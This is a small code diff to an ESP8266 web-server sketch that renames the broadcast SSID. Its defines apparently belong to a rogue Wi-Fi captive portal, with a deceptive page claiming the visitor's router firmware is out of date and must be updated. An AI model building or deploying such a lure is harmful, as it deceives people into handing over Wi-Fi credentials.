@@ -3,7 +3,7 @@
 #include <ESP8266WebServer.h>
 #include <EEPROM.h>
 
-#define SSID_NAME "use at your own risk"
+#define SSID_NAME "wifi name"
 #define SUBTITLE "Router info."
 #define TITLE "update"
 #define BODY "Your router firmware is out of date Update your firmware to continue browsing normally."
